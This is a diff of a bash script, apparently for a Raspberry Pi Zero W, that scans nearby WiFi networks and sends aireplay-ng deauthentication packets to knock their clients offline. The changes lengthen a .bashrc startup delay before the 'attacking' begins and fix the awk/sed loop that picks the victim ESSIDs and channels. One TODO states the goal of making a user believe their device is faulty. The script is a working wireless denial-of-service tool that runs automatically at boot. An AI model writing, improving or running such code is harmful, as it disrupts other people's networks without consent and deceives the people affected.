@@ -1,9 +1,10 @@
 #!/bin/bash
 
 #TODO: Prevent a device from connecting to networks (aka make the user believe the device is problematic)
-# aireplay-ng -0 $n -a $your_AP -c $mac $interface --ignore-negative-one
-
+# 		aireplay-ng -0 $n -a $your_AP -c $mac $interface --ignore-negative-one
 #TODO: Add a feature to target the closest WiFi in range. We'll play with PWR values in the scan file.
+#TODO: Use /etc/rc.local instead of .bashrc
+#TODO: make autologin feature more safe (by keeping a backup and making a symlink to getty.target.wants)
 
 #this is your interface and since we use raspi0w, nexmon utilities use the same name for monitor mode
 interface="wlan0"
@@ -84,11 +85,11 @@ menu()
 
 			#add start up entry if it doesn't exist
 			if [[ $(grep -o "rasperi.sh" ~/.bashrc) != "rasperi.sh" ]]; then
-				#include 5 seconds for safety, so you can ssh
-				echo "sleep 10; ./rasperish/rasperi.sh --closest" >> ~/.bashrc
+				#include 15 seconds for safety, so you can ssh
+				echo "sleep 15; ./rasperish/rasperi.sh --closest" >> ~/.bashrc
 			fi
 			echo "	[i] Closest mode enabled, will be available after reboot."
-			echo "	[!] Note that you have 10 seconds delay before the attacking after reboot,"
+			echo "	[!] You have 15 seconds delay before the attacking after reboot,"
 			echo "      so that you can connect and stop your pi."
 			sleep 4
 			;;
@@ -96,11 +97,11 @@ menu()
 		4 )
 			#add start up entry if it doesn't exist
 			if [[ $(grep -o "rasperi.sh" ~/.bashrc) != "rasperi.sh" ]]; then
-				#include 5 seconds for safety, so you can ssh
-				echo "sleep 10; ./rasperish/rasperi.sh --haki" >> ~/.bashrc
+				#include 15 seconds for safety, so you can ssh
+				echo "sleep 15; ./rasperish/rasperi.sh --haki" >> ~/.bashrc
 			fi
 			echo "	[i] Haki mode enabled, will be available after reboot."
-			echo "	[!] Note that you have 10 seconds delay before the attacking after reboot,"
+			echo "	[!] You have 15 seconds delay before the attacking after reboot,"
 			echo "      so that you can connect and stop your pi."
 			sleep 4
 			;;
@@ -148,7 +149,7 @@ haki()
 		while read essid
 		do
 			#get each corresponding channel for every essid found
-			channel=$(sed -n "${i}{p;q;}" $(awk -F "\"*;\"*" '{print $6}' "$working_folder"/perish_dump/scan_data-01.kismet.csv | tail -n 2))
+			channel=$(awk -F "\"*;\"*" '{print $6}' "$working_folder"/perish_dump/scan_data-01.kismet.csv | tail -n 2 | sed -n "${i}{p;q;}")
 
 			echo "	[+] Synchronising card to channel: $channel"
 			#sync the card to the victim's channel
@@ -159,7 +160,7 @@ haki()
 			aireplay-ng -0 5 -e $essid $interface --ignore-negative-one > /dev/null 2>&1
 
 			((i++))
-		done < $(awk -F "\"*;\"*" '{print $3}' "$working_folder"/perish_dump/scan_data-01.kismet.csv | tail -n 2)
+		done <<< $(awk -F "\"*;\"*" '{print $3}' "$working_folder"/perish_dump/scan_data-01.kismet.csv | tail -n 2)
 	done #loop when you are done
 }
 
